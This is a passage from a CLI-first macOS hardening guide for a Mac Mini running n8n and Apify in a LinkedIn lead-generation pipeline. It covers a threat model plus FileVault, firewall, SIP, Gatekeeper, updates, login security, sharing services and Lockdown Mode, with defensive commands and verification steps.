# macOS Hardening Guide for n8n + Apify Deployment

<!-- markdownlint-disable MD013 -->

## Table of Contents

- [Preamble](#preamble)
- [1. Threat Model](#1-threat-model)
- [2. OS Foundation (Prevent)](#2-os-foundation-prevent)
- [3. Network Security (Prevent)](#3-network-security-prevent)
- [4. Container Isolation (Prevent) — Containerized Path](#4-container-isolation-prevent--containerized-path)
- [5. n8n Platform Security (Prevent)](#5-n8n-platform-security-prevent)
- [6. Bare-Metal Path (Prevent) — Bare-Metal Only](#6-bare-metal-path-prevent--bare-metal-only)
- [7. Data Security (Prevent)](#7-data-security-prevent)
- [8. Detection and Monitoring (Detect)](#8-detection-and-monitoring-detect)
- [9. Response and Recovery (Respond)](#9-response-and-recovery-respond)
- [10. Operational Maintenance](#10-operational-maintenance)
- [11. Audit Script Reference](#11-audit-script-reference)
- [Appendix A: Security Environment Variable Reference](#appendix-a-security-environment-variable-reference)
- [Appendix B: Credential Inventory Template](#appendix-b-credential-inventory-template)
- [Appendix C: Incident Response Checklist](#appendix-c-incident-response-checklist)
- [Appendix D: Tool Comparison Matrix](#appendix-d-tool-comparison-matrix)
- [Appendix E: PII Data Classification Table](#appendix-e-pii-data-classification-table)

---

## Preamble

### Purpose and Scope

This guide provides a comprehensive, CLI-first hardening procedure for a Mac Mini running **n8n** (workflow automation) and **Apify** (web scraping) in a LinkedIn lead-generation pipeline. It covers macOS Sonoma (14) and Tahoe (26) and is written for an operator who manages the system but is not a macOS security specialist.

The guide assumes:

- A dedicated Mac Mini (Apple Silicon or Intel) running n8n and Apify actors
- The system processes LinkedIn profile data, which may include PII
- The operator has administrator access and a working internet connection
- All instructions are CLI-only — no GUI-only steps

### How to Use This Guide

1. Read §1 (Threat Model) to understand what you are protecting and from whom.
2. Choose your deployment path using the decision tree below.
3. Follow the Quick-Start Checklist to prioritize your hardening actions.
4. Work through each section relevant to your deployment path.
5. Schedule the audit script (`scripts/hardening-audit.sh`) to run regularly (§10).

### Deployment Path Decision Tree

Choose **one** deployment path. Both paths produce equivalent security posture; they differ in isolation strategy.

```text
Do you need workflow-level process isolation?
├── YES → Containerized Path (§4 + §5)
│         Uses Colima (or Docker Desktop) + Docker to run n8n in a container.
│         Better blast-radius containment.
│         Requires: Docker CLI, Colima or Docker Desktop, ~4 GB RAM overhead.
│
└── NO  → Bare-Metal Path (§6 + §5)
          Runs n8n natively via launchd.
          Simpler setup, fewer moving parts.
          Requires: dedicated macOS service account.
```

Sections §2, §3, §7, §8, §9, §10, and §11 apply to **both** paths. Sections marked "Containerized Path" or "Bare-Metal Only" apply only to their respective path.

### Notation Conventions

| Notation | Meaning |
|----------|---------|
| `§X.Y` | Cross-reference to section X.Y of this guide |
| `CHK-*` | Audit check identifier (see §11.2 and `scripts/CHK-REGISTRY.md`) |
| `[PAID]` | Paid tool — cost and free alternative noted inline |
| **Prevent** / **Detect** / **Respond** | Defensive layer labels per defense-in-depth |
| `[Containerized]` / `[Bare-Metal]` | Deployment-path-specific instruction |
| `[EDUCATIONAL]` | Non-automated guidance — manual process or awareness item |

### Quick-Start Checklist

Complete these actions in the order shown. Each item links to the relevant guide section.

> **WARNING — Lockout Prevention**: Several immediate actions have ordering dependencies. Read the warnings below each constraint before proceeding.

#### Tier 1: Immediate (do first)

These controls close critical attack vectors with minimal effort and no tool installation.

1. [ ] Enable FileVault disk encryption (§2.1)
   - > **WARNING**: On a headless server, configure `fdesetup authrestart` BEFORE enabling FileVault — otherwise the server cannot reboot unattended.
2. [ ] Enable application firewall + stealth mode (§2.2)
3. [ ] Verify SIP is enabled (§2.3)
4. [ ] Verify Gatekeeper is enabled (§2.4)
5. [ ] Enable automatic software updates (§2.5)
6. [ ] Enable screen lock and set login window security (§2.6)
7. [ ] Disable guest account (§2.7)
8. [ ] Disable automatic login (§2.6)
9. [ ] Disable sharing services — Screen Sharing, File Sharing, Remote Login, Remote Management, AirDrop, Handoff (§2.7)
   - > **WARNING**: On a headless server, verify SSH or Screen Sharing is working BEFORE disabling other remote access methods.
10. [ ] Change SSH defaults — key-only auth, disable root login, `AllowUsers`, ed25519 keys (§3.1)
    - > **WARNING**: Install and test your SSH key BEFORE disabling password authentication — otherwise you are locked out of a headless server.
11. [ ] Disable or restrict n8n REST API access — set `N8N_PUBLIC_API_DISABLED=true` (§5.4)
12. [ ] Configure n8n webhook authentication (§5.5)
    - > **WARNING**: Enable n8n authentication BEFORE binding n8n to a network interface if remote access is needed.
13. [ ] Enable NTP time synchronization integrity (§2.5)
14. [ ] Disable core dumps (§2.10)
15. [ ] Disable unnecessary iCloud services (§8.6)
16. [ ] Physical security basics — recovery mode password, secure location (§9.5)

#### Tier 2: Follow-up (do next)

These controls require tool installation or more complex configuration.

1. [ ] Install antivirus/EDR — Santa (`northpolesec/santa`) or ClamAV (§8.1)
2. [ ] Set up IDS — osquery, Santa file monitoring (§8.1)
3. [ ] Configure outbound filtering — LuLu (free) or Little Snitch `[PAID]` ~$59 (§3.3)
   - Containerized: iptables inside Colima VM, not macOS pf (§3.3)
4. [ ] Deploy n8n in a container via Colima + Docker `[Containerized]` (§4)
5. [ ] Set up credential management — macOS Keychain or Bitwarden (§7.1)
6. [ ] Configure DNS security — DoH/DoT via Quad9 (§3.2)
7. [ ] Harden Bluetooth — keep on for keyboard/mouse, disable discoverability (§3.4)
8. [ ] Restrict USB/Thunderbolt (§9.5)
9. [ ] Audit all persistence mechanisms — LaunchAgents, LaunchDaemons, login items (§8.2)
10. [ ] Configure IPv6 — disable or dual-stack pf rules (§3.5)
11. [ ] Set up macOS logging and configure log review (§8.4)
12. [ ] Configure Time Machine or other backup (§9.3)
13. [ ] Implement PII data controls for scraped LinkedIn data (§7.4)
14. [ ] Audit n8n workflows for injection vulnerabilities — Execute Command nodes, Code nodes processing scraped data, LLM nodes without input validation (§5.6)
15. [ ] Pin Docker images by digest and verify Homebrew package integrity (§7.7)
16. [ ] Establish credential rotation schedule (§7.2)
17. [ ] Create listening service baseline via `lsof -iTCP -sTCP:LISTEN` (§3.6)
18. [ ] Run hardening validation tests (§10.6)
19. [ ] Harden Screen Sharing/VNC if enabled (§2.7)
20. [ ] Configure DNS query logging and covert channel defense (§3.2)
21. [ ] Harden temp file and cache security (§2.10)
22. [ ] Create certificate trust store baseline (§8.7)
23. [ ] Audit and remove unauthorized configuration profiles (§2.10)
24. [ ] Configure Spotlight exclusions for n8n data directories (§2.10)
25. [ ] Deploy canary files and honey credentials (§8.5)
26. [ ] Scan Docker images for vulnerabilities `[Containerized]` (§4.4)
27. [ ] Migrate secrets from environment variables to Docker secrets `[Containerized]` (§7.1)
28. [ ] Set up dedicated service account `[Bare-Metal]` (§6.1)
29. [ ] Configure launchd execution `[Bare-Metal]` (§6.3)
30. [ ] Set filesystem permissions `[Bare-Metal]` (§6.4)
31. [ ] Configure SSRF defense and internal network access control (§7.5)
32. [ ] Audit and restrict TCC privacy permissions (§2.10)

#### Tier 3: Ongoing (maintain)

These controls require periodic action.

1. [ ] Re-run audit script (`scripts/hardening-audit.sh`) — weekly recommended (§11.1)
2. [ ] Update security tool signatures (Santa rules, ClamAV defs) (§10.3)
3. [ ] Review macOS and n8n logs (§8.4)
4. [ ] Run post-update checklist after macOS updates (§5.9)
5. [ ] Rotate credentials per lifecycle policy (§7.2)
6. [ ] Re-audit persistence mechanisms after software changes (§8.2)
7. [ ] Review n8n execution logs for injection indicators — unexpected commands, anomalous outbound connections, LLM behavior changes (§5.6)
8. [ ] Re-audit workflows after adding or modifying nodes that process scraped data (§5.6)
9. [ ] Verify monitoring infrastructure is intact — launchd job, notification config, log directory (§10.1)
10. [ ] Verify Docker image digests against known-good values after pulls `[Containerized]` (§7.7)
11. [ ] Review webhook access logs for abuse patterns (§5.5)
12. [ ] Verify listening service inventory against baseline (§3.6)
13. [ ] Annual emergency credential rotation practice run (§7.2)
14. [ ] Review DNS query logs for anomalous exfiltration patterns (§3.2)
15. [ ] Verify audit log integrity via hash chain (§8.4)
16. [ ] Verify certificate trust store against baseline (§8.7)
17. [ ] Clipboard hygiene during credential management operations (§7.10)
18. [ ] Verify canary file integrity (§8.5)
19. [ ] Rescan Docker images for newly discovered CVEs `[Containerized]` (§4.4)

---

## 1. Threat Model

### Platform Description

This guide secures a **Mac Mini** (Apple Silicon or Intel) running:

- **n8n**: Open-source workflow automation platform handling LinkedIn lead-generation pipelines
- **Apify**: Web scraping platform whose actors collect LinkedIn profile data and feed it into n8n workflows
- **LinkedIn lead generation**: The combined workload scrapes public LinkedIn profiles, enriches data, and stores it for outreach campaigns

The system operates as an always-on, headless (or semi-headless) server on a home or office network.

### Assets to Protect

| Asset | Impact if Compromised |
|-------|----------------------|
| **LinkedIn session cookies and API tokens** | Account ban, legal liability, loss of scraping capability |
| **n8n encryption key** | All stored credentials decryptable — full lateral movement |
| **n8n admin password and TOTP secrets** | Unauthorized workflow access, credential extraction via UI |
| **Apify API tokens** | Unauthorized actor execution, data exfiltration, billing abuse |
| **SSH private keys** | Remote access to the server, lateral movement |
| **SMTP and notification credentials** | Phishing from trusted sender, alert suppression |
| **Scraped PII** (names, emails, job titles, profile URLs) | GDPR/CCPA breach notification obligations, reputational damage |
| **macOS Keychain contents** | Cross-service credential theft |
| **Workflow definitions** | Business logic exposure, injection of malicious nodes |
| **System integrity** (SIP, Gatekeeper, FileVault) | Persistent rootkit, undetectable surveillance |
| **Network position** | Pivot point into home/office LAN, SSRF to internal services |
| **Backup data** (Time Machine, exports) | Offline extraction of all of the above |

### Adversary Profiles

| Adversary | Motivation | Capability | Likely Attack Vector |
|-----------|-----------|------------|---------------------|
| **Opportunistic attacker** | Cryptocurrency mining, botnet recruitment | Automated scanning, known CVE exploitation | Exposed n8n instance, default credentials, unpatched macOS |
| **Targeted attacker** | Credential theft, PII exfiltration, pipeline disruption | Phishing, n8n exploitation, social engineering | n8n webhook endpoints, leaked `.env` files, clipboard sniffing, workflow exfiltration |
| **Supply chain attacker** | Implant malware into build/runtime environment | Compromised npm packages, Docker images, Homebrew formulae | Malicious community node, trojanized base image, dependency confusion |
| **Insider (operator misuse)** | Data exfiltration, cover tracks, disrupt service | Full system access, legitimate credentials | Direct Keychain access, workflow modification, audit log tampering |
| **LinkedIn platform enforcement** | Terms of Service enforcement | IP blocking, account suspension, legal action | Detection of scraping patterns, session anomalies |
| **Nation-state (advanced)** | Espionage, PII harvesting | Zero-day exploits, supply chain attacks, physical access | SIP bypass, firmware implants, network interception |

### Attack Surface Map

```text
Internet
  │
  ├── n8n webhook endpoints (inbound HTTP)
  ├── Apify API calls (outbound HTTPS)
  ├── LinkedIn scraping traffic (outbound HTTPS)
  ├── DNS queries (potential exfiltration channel)
  ├── Software update channels (supply chain)
  │
  ├── Local Network
  │     ├── SSH (if enabled)
  │     ├── Screen Sharing / VNC (if enabled)
  │     ├── AirDrop / Handoff / Bonjour
  │     ├── Shared folders (SMB/AFP)
  │     └── mDNS service discovery
  │
  └── Physical
        ├── USB / Thunderbolt ports
        ├── Recovery Mode (firmware password)
        └── Disk access (FileVault protection)

Internal
  ├── n8n REST API (if bound to 0.0.0.0)
  ├── n8n execution engine (Code nodes, Execute Command)
  ├── Docker socket (if containerized)
  ├── LaunchAgents / LaunchDaemons (persistence)
  ├── macOS Keychain
  ├── TCC database (privacy permissions)
  ├── Swap / core dumps (memory artifacts)
  └── iCloud sync (credential/document leakage)
```

### Scope Exclusions

This guide does **not** cover:

- **Cloud-hosted n8n deployments** (AWS, GCP, Azure) — different threat model entirely
- **iOS/iPadOS devices** connected to the same Apple ID
- **Mail server hardening** — out of scope unless n8n sends email
- **Web application penetration testing** of n8n itself — n8n is treated as a trusted platform; we harden its configuration, not its code
- **Hardware supply chain verification** — we assume the Mac Mini hardware is genuine
- **Compliance framework certification** (SOC 2, ISO 27001) — this guide informs but does not certify

---

## 2. OS Foundation (Prevent)

### 2.1 Disk Encryption (FileVault)

**Threat**: Physical attacker or insider extracts credentials and PII from disk without authentication
**Layer**: Prevent
**Deployment**: Both
**Source**: [Apple Platform Security — FileVault](https://support.apple.com/guide/security/volume-encryption-with-filevault-sec4c6dc1b6e/web), [CIS Apple macOS Benchmark — 2.6.1](https://www.cisecurity.org/benchmark/apple_os)

#### Why This Matters

Without FileVault, anyone with physical access to the Mac Mini can boot from external media and read all files — n8n encryption keys, LinkedIn session tokens, Apify API keys, scraped PII, and SSH private keys. FileVault uses XTS-AES-128 encryption with a 256-bit key derived from your login password, making data unreadable without authentication.

#### How to Harden

**Check current status:**

```bash
sudo fdesetup status
```

**Enable FileVault:**

```bash
sudo fdesetup enable
```

Save the recovery key printed to the terminal in a secure, offline location (not on the Mac itself). The recovery key is the only way to unlock the disk if you forget your password.

**Configure headless reboot (critical for servers):**

Before enabling FileVault on a headless server, configure authenticated restart so the server can reboot unattended without someone typing the FileVault password at the physical console:

```bash
# Verify authrestart is supported
sudo fdesetup supportsauthrestart

# Perform an authenticated restart (caches unlock credentials for one reboot)
sudo fdesetup authrestart
```

> **WARNING**: Without `fdesetup authrestart`, a FileVault-encrypted headless server will hang at the pre-boot login screen after every reboot, requiring physical console access. Always test `authrestart` before relying on remote reboots.

**Verify swap encryption (automatic with FileVault):**

```bash
sysctl vm.swapusage
# Swap files in /private/var/vm/ are encrypted when FileVault is active
```

#### Verification

```bash
# Expected: "FileVault is On."
sudo fdesetup status

# Confirm recovery key is escrowed (institutional) or saved
sudo fdesetup haspersonalrecoverykey
```

#### Edge Cases and Warnings

- **Recovery key loss**: If you lose both the login password and recovery key, data is unrecoverable. Store the recovery key in a separate physical location or Bitwarden vault.
- **Performance**: Modern Apple Silicon and Intel Macs with T2 chip handle FileVault encryption in hardware — no measurable performance impact.
- **Hibernation images**: The sleep image (`/private/var/vm/sleepimage`) contains a full RAM snapshot. FileVault encrypts it at rest, but see §2.10 for additional hibernation hardening.
- **Time Machine backups**: FileVault does not encrypt Time Machine backups — configure backup encryption separately (§9.3).

**Audit check**: `CHK-FILEVAULT` (FAIL) → §2.1

### 2.2 Firewall

**Threat**: Network attacker discovers and exploits services listening on open ports
**Layer**: Prevent
**Deployment**: Both
**Source**: [Apple — Use the application firewall](https://support.apple.com/en-us/102445), [CIS Apple macOS Benchmark — 2.2.1](https://www.cisecurity.org/benchmark/apple_os)

#### Why This Matters

macOS ships with the application firewall disabled. Without it, any application can accept incoming connections — exposing n8n, debugging ports, and system services to the local network. Stealth mode makes the Mac Mini invisible to port scans by not responding to ICMP probes or closed-port connection attempts.

#### How to Harden

**Enable the application firewall:**

```bash
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on
```

**Enable stealth mode:**

```bash
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on
```

**Enable logging:**

```bash
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setloggingmode on
```

**Block all incoming connections (strictest — optional):**

```bash
# Only enable if you manage the server exclusively via SSH
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setblockall on
```

> **NOTE**: The application firewall controls incoming connections per application. For outbound filtering, see §3.3 (pf rules, LuLu, or Little Snitch).

#### Verification

```bash
# Expected: "Firewall is enabled. (State = 1)"
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate

# Expected: "Stealth mode enabled"
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getstealthmode

# List application-specific rules
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --listapps
```

#### Edge Cases and Warnings

- **macOS updates can reset firewall state**: After macOS upgrades, verify the firewall is still enabled (§10.3 post-update checklist).
- **Application-level vs packet-level**: The macOS application firewall operates at the application level. For packet-level filtering (IP/port rules), use `pf` (§3.3).
- **Signed applications bypass**: By default, signed applications can receive incoming connections. Use `--setallowsigned off` for stricter control, but test first — this can break macOS services.

**Audit checks**: `CHK-FIREWALL` (FAIL), `CHK-STEALTH` (WARN) → §2.2

### 2.3 System Integrity Protection (SIP)

**Threat**: Malware or attacker with root access modifies protected system files, kernel extensions, or runtime protections
**Layer**: Prevent
**Deployment**: Both
**Source**: [Apple — About System Integrity Protection](https://support.apple.com/en-us/102149), [CIS Apple macOS Benchmark — 5.1.2](https://www.cisecurity.org/benchmark/apple_os)

#### Why This Matters

SIP prevents even the root user from modifying protected system directories (`/System`, `/usr` except `/usr/local`, `/sbin`, `/bin`), loading unsigned kernel extensions, and attaching to system processes. Without SIP, a compromised root account can install persistent rootkits, modify system binaries, and disable all other security controls. On Tahoe (macOS 26), SIP protects additional components behind the signed system volume.

#### How to Harden

SIP is enabled by default. Verify it has not been disabled:

```bash
csrutil status
```

If SIP is disabled, re-enable it:

1. Restart the Mac and boot into Recovery Mode:
   - **Apple Silicon**: Hold the power button until "Loading startup options" appears → Options → Startup Security Utility
   - **Intel**: Hold Cmd+R during boot
2. Open Terminal from the Utilities menu
3. Run: `csrutil enable`
4. Restart

#### Verification

```bash
# Expected: "System Integrity Protection status: enabled."
csrutil status
```

#### Edge Cases and Warnings

- **Cannot enable/disable from normal boot**: SIP changes require Recovery Mode — this is by design.
- **Tahoe vs Sonoma**: Tahoe (macOS 26) extends SIP to protect more system volume components. The same `csrutil status` command works on both versions.
- **Some developer tools request SIP disable**: Never disable SIP on a production server. Developer workflows requiring SIP changes should use a separate development machine.
- **Single User Mode**: Disabled by SIP on macOS Catalina and later. Unavailable on Apple Silicon.

**Audit check**: `CHK-SIP` (FAIL) → §2.3

### 2.4 Gatekeeper and XProtect

**Threat**: Supply-chain attacker distributes malicious or tampered applications that execute without verification
**Layer**: Prevent
**Deployment**: Both
**Source**: [Apple Platform Security — Gatekeeper and runtime protection](https://support.apple.com/guide/security/gatekeeper-and-runtime-protection-sec5599b66df/web), [CIS Apple macOS Benchmark — 2.6.4](https://www.cisecurity.org/benchmark/apple_os)

#### Why This Matters

Gatekeeper verifies that applications are signed by identified developers and notarized by Apple (scanned for malware) before allowing execution. XProtect provides signature-based malware detection on file open, while XProtect Remediator (Ventura and later) automatically removes known malware. Together, these form the first line of defense against trojanized tools — relevant because this deployment relies on Homebrew packages, Docker images, and npm modules.

#### How to Harden

**Verify Gatekeeper is enabled:**

```bash
spctl --status
# Expected: "assessments enabled"
```

**Enable Gatekeeper if disabled:**

```bash
sudo spctl --master-enable
```

**Verify automatic security updates (includes XProtect signature updates):**

```bash
# Check if automatic checks are enabled
defaults read /Library/Preferences/com.apple.SoftwareUpdate AutomaticCheckEnabled
# Expected: 1

# Check if XProtect/MRT updates install automatically
defaults read /Library/Preferences/com.apple.SoftwareUpdate ConfigDataInstall
# Expected: 1
```

**Check XProtect signature freshness:**

```bash
# Find latest XProtect update date
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 2 "XProtect"
```

**macOS defense stack summary:**

| Layer | Function | Update Method |
|-------|----------|---------------|
| **Gatekeeper** | Blocks unsigned/un-notarized apps | Built-in, always active |
| **XProtect** | Signature-based malware scan on file open | Silent background updates |
| **XProtect Remediator** | Automated known-malware removal (Ventura+) | Silent background updates |
| **MRT** | Legacy malware removal (pre-Ventura) | Replaced by Remediator |
| **Notarization** | Apple pre-scans apps for malware before distribution | Developer-side |

#### Verification

```bash
# Gatekeeper status
spctl --status

# XProtect version (Sonoma/Tahoe)
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 5 "XProtect" | tail -6
```

#### Edge Cases and Warnings

- **Homebrew tools**: Some Homebrew-installed CLI tools are not notarized. Gatekeeper may flag them as "damaged" or block execution. Use `xattr -d com.apple.quarantine /path/to/binary` on verified tools only — never blindly remove quarantine attributes.
- **Tahoe vs Sonoma**: Tahoe (macOS 26) enforces stricter Gatekeeper runtime checks and flags apps "damaged" more aggressively. Verify Homebrew tools still work after upgrading.
- **Notarization is not a guarantee**: Apple scans for known malware at notarization time. A clean notarization does not mean the app is safe — it means Apple didn't detect anything at submission time.
- **XProtect is baseline only**: XProtect's signature database is much smaller than ClamAV. Install additional antivirus for broader coverage (§8.1).

**Audit checks**: `CHK-GATEKEEPER` (FAIL), `CHK-XPROTECT-FRESH` (WARN) → §2.4

### 2.5 Software Updates

**Threat**: Known vulnerabilities remain unpatched, allowing exploitation of publicly disclosed CVEs
**Layer**: Prevent
**Deployment**: Both
**Source**: [Apple — Keep your Mac up to date](https://support.apple.com/en-us/108382), [CIS Apple macOS Benchmark — 1.1](https://www.cisecurity.org/benchmark/apple_os)

#### Why This Matters

Delayed software updates leave known vulnerabilities exploitable. Apple releases Rapid Security Responses for critical issues between major updates. On a server running n8n with internet-facing webhooks and scraped PII, an unpatched kernel or framework vulnerability can lead to remote code execution or privilege escalation.

#### How to Harden

**Enable all automatic update categories:**

```bash
# Enable automatic checking
sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate AutomaticCheckEnabled -bool true

# Download updates automatically
sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate AutomaticDownload -bool true

# Install macOS updates automatically
sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate AutomaticallyInstallMacOSUpdates -bool true

# Install critical/security updates automatically (Rapid Security Responses)
sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate CriticalUpdateInstall -bool true

# Install XProtect/MRT/config data updates automatically
sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate ConfigDataInstall -bool true
```

**Check for pending updates manually:**

```bash
softwareupdate --list
```

**Install all available updates:**

```bash
sudo softwareupdate --install --all --restart
```

#### Verification

```bash
# Verify all auto-update settings
defaults read /Library/Preferences/com.apple.SoftwareUpdate AutomaticCheckEnabled
defaults read /Library/Preferences/com.apple.SoftwareUpdate AutomaticDownload
defaults read /Library/Preferences/com.apple.SoftwareUpdate CriticalUpdateInstall
# All should return: 1

# Check last successful update
softwareupdate --history | head -5
```

#### Edge Cases and Warnings

- **Reboot required**: Major macOS updates require a reboot. On a headless server with FileVault, use `fdesetup authrestart` (§2.1) to avoid hanging at the pre-boot screen.
- **Post-update verification**: macOS updates can reset firewall settings, sharing services, and other security controls. Run the audit script after every update (§10.3).
- **n8n downtime**: Plan update windows around workflow schedules. Stop n8n gracefully before restarting.
- **NTP synchronization**: Verify time sync is active — accurate timestamps are essential for TLS certificate validation, log correlation, and credential expiry detection:

```bash
# Verify NTP is active
systemsetup -getusingnetworktime
# Expected: "Network Time: On"

# Check time server
systemsetup -getnetworktimeserver
# Expected: "time.apple.com" (default, supports NTS on newer macOS)

# Verify clock is not skewed
sntp time.apple.com
```

**Audit checks**: `CHK-AUTO-UPDATES` (WARN), `CHK-NTP` (WARN) → §2.5

### 2.6 Screen Lock and Login Security

**Threat**: Unattended Mac Mini accessed physically or via Screen Sharing without authentication; automatic login bypasses all user-level security controls
**Layer**: Prevent
**Deployment**: Both
**Source**: [CIS Apple macOS Benchmark — 2.10, 6.1.2](https://www.cisecurity.org/benchmark/apple_os)

#### Why This Matters

Automatic login and disabled screen lock let anyone with physical access or Screen Sharing reach the desktop without credentials — giving full access to n8n, Keychain, SSH keys, and scraped PII. On a headless server, these controls also prevent unauthorized remote sessions.

#### How to Harden

**Disable automatic login:**

```bash
sudo defaults write /Library/Preferences/com.apple.loginwindow autoLoginUser -string ""
sudo defaults delete /Library/Preferences/com.apple.loginwindow autoLoginUser 2>/dev/null || true
```

**Require password immediately after sleep/screen saver:**

```bash
# Require password immediately (0 seconds delay)
defaults write com.apple.screensaver askForPassword -int 1
defaults write com.apple.screensaver askForPasswordDelay -int 0
```

**Set screen saver to activate after 5 minutes of inactivity:**

```bash
defaults write com.apple.screensaver idleTime -int 300
```

**Configure login window to show name and password fields (not user list):**

```bash
# Don't reveal valid usernames at login screen
sudo defaults write /Library/Preferences/com.apple.loginwindow SHOWFULLNAME -bool true
```

**Disable login window password hints:**

```bash
sudo defaults write /Library/Preferences/com.apple.loginwindow RetriesUntilHint -int 0
```

**Set display sleep on a headless server:**

```bash
# Display sleep after 5 minutes (saves power, triggers screen lock)
sudo pmset -a displaysleep 5
```

**Multi-operator shared Mac Mini:** If multiple people manage the server, designate one as the security owner responsible for audit reviews. Create non-admin accounts for daily use; reserve the admin account for system changes only.

#### Verification

```bash
# Verify auto-login is disabled (should return error or empty)
defaults read /Library/Preferences/com.apple.loginwindow autoLoginUser 2>&1
# Expected: error or empty string

# Verify password required immediately
defaults read com.apple.screensaver askForPassword
# Expected: 1
defaults read com.apple.screensaver askForPasswordDelay
# Expected: 0

# Verify login window shows name+password (not user list)
sudo defaults read /Library/Preferences/com.apple.loginwindow SHOWFULLNAME
# Expected: 1
```

#### Edge Cases and Warnings

- **FileVault implies no auto-login**: When FileVault is enabled, macOS disables automatic login. This control is defense-in-depth.
- **Headless servers**: Screen lock still matters — Screen Sharing sessions inherit the screen state. If the screen is unlocked, a Screen Sharing connection gets immediate access.
- **Memory and swap security**: See §2.10 for hibernation mode, core dump, and swap encryption controls that protect credentials in volatile storage.

**Audit checks**: `CHK-AUTO-LOGIN` (FAIL), `CHK-SCREEN-LOCK` (WARN) → §2.6

### 2.7 Guest Account and Sharing Services

**Threat**: Guest account provides unauthenticated local access; sharing services expose file systems, remote execution, and network services to LAN attackers
**Layer**: Prevent
**Deployment**: Both
**Source**: [CIS Apple macOS Benchmark — 6.1.3, 2.3.*](https://www.cisecurity.org/benchmark/apple_os)

#### Why This Matters

The macOS guest account allows anyone to log in without a password and access the network. Sharing services (File Sharing, Remote Apple Events, Internet Sharing, AirPlay) each add attack surface — Remote Apple Events alone enables external applications to execute code on your Mac. On a server handling credentials and PII, every unnecessary service is a potential entry point.

#### How to Harden

**Disable the guest account:**

```bash
sudo defaults write /Library/Preferences/com.apple.loginwindow GuestEnabled -bool false
```

**Disable all sharing services:**

```bash
# File Sharing (SMB/AFP) — use scp/rsync over SSH instead
sudo launchctl disable system/com.apple.smbd

# Remote Apple Events — allows external code execution
sudo systemsetup -setremoteappleevents off

# Internet Sharing — turns Mac into NAT gateway
sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.nat NAT -dict-add Enabled -bool false

# Content Caching
sudo AssetCacheManagerUtil deactivate 2>/dev/null || true

# AirPlay Receiver
defaults write com.apple.controlcenter AirplayRecieverEnabled -bool false

# Bluetooth Sharing
defaults -currentHost write com.apple.bluetooth PrefKeyServicesEnabled -bool false

# Printer Sharing
cupsctl --no-share-printers

# Media Sharing
defaults write com.apple.amp.mediasharingd home-sharing-enabled -bool false
```

**Screen Sharing / VNC hardening (if Screen Sharing must stay enabled):**

> **WARNING**: On a headless server, verify SSH is working BEFORE disabling Screen Sharing.

```bash
# Preferred: Disable Screen Sharing entirely if managing via SSH
sudo launchctl disable system/com.apple.screensharing

# If Screen Sharing is needed:
# 1. Require macOS account authentication (not legacy VNC password)
sudo defaults write /Library/Preferences/com.apple.RemoteManagement VNCAlwaysStartOnConsole -bool true

# 2. Access via SSH tunnel for encryption:
#    From client: ssh -L 5900:localhost:5900 user@mac-mini
#    Then connect VNC to localhost:5900
```

**Disable AirDrop and Handoff:**

```bash
# AirDrop — file transfer between nearby devices
defaults write com.apple.NetworkBrowser DisableAirDrop -bool true

# Handoff — cross-device clipboard and activity sharing
defaults -currentHost write com.apple.coreservices.useractivityd ActivityAdvertisingAllowed -bool false
defaults -currentHost write com.apple.coreservices.useractivityd ActivityReceivingAllowed -bool false
```

**Verify Remote Login (SSH) status:**

```bash
# Check current status (managed separately in §3.1)
sudo systemsetup -getremotelogin
```

#### Verification

```bash
# Guest account disabled
sudo defaults read /Library/Preferences/com.apple.loginwindow GuestEnabled
# Expected: 0

# File Sharing disabled
launchctl print system/com.apple.smbd 2>&1 | grep -c "state = " || echo "disabled"

# Remote Apple Events disabled
sudo systemsetup -getremoteappleevents
# Expected: "Remote Apple Events: Off"

# Screen Sharing disabled (or hardened)
launchctl print system/com.apple.screensharing 2>&1 | grep "state" || echo "disabled"

# AirDrop disabled
defaults read com.apple.NetworkBrowser DisableAirDrop 2>/dev/null
# Expected: 1
```

#### Edge Cases and Warnings

- **macOS updates can re-enable sharing services**: After every macOS update, re-run the audit script to verify all sharing services remain disabled (§10.3).
- **VNC password weakness**: Legacy VNC passwords are limited to 8 characters with weak DES encryption. Always use macOS account authentication and SSH tunneling.
- **Remote Apple Events**: This is one of the most dangerous services — it allows external applications to send Apple Events, which can execute arbitrary commands. Always disable it.
- **mDNS/Bonjour**: macOS advertises services via mDNS (Bonjour). Disabling sharing services reduces mDNS advertisements but does not fully stop mDNS. See §3.6 for mDNS restriction.

**Audit checks**: `CHK-GUEST` (FAIL), `CHK-SHARING-FILE` (FAIL), `CHK-SHARING-REMOTE-EVENTS` (FAIL), `CHK-SHARING-INTERNET` (FAIL), `CHK-SHARING-SCREEN` (WARN), `CHK-AIRDROP` (WARN) → §2.7

### 2.8 Lockdown Mode

**Threat**: Advanced attacker exploits broad attack surface including JIT JavaScript, message attachments, wired connections, and configuration profiles
**Layer**: Prevent
**Deployment**: Both
**Source**: [Apple — About Lockdown Mode](https://support.apple.com/en-us/105120)

#### Why This Matters

Lockdown Mode is Apple's highest security setting, designed to protect against targeted attacks by nation-state-level adversaries. It dramatically reduces the attack surface by disabling JIT JavaScript compilation, blocking most message attachment types, restricting wired connections, and preventing configuration profile installation. For a headless server managed exclusively via SSH, the tradeoffs are minimal.

#### How to Harden

`[EDUCATIONAL]` — Lockdown Mode is an optional advanced control. Evaluate compatibility before enabling.

**Enable Lockdown Mode (requires restart):**

```bash
# Via System Settings > Privacy & Security > Lockdown Mode > Turn On
# No CLI-only method is available — requires interactive confirmation
```

**Compatibility assessment for n8n deployments:**

| Feature | Impact | Workaround |
|---------|--------|------------|
| JIT JavaScript disabled | n8n web UI may load slowly if accessed from local Safari | Access n8n UI from a separate machine, or use SSH tunneling |
| Message attachments blocked | No impact on headless server | N/A |
| Incoming FaceTime blocked | No impact | N/A |
| Wired connections restricted | Test Docker/Colima USB-C connectivity | Verify before enabling |
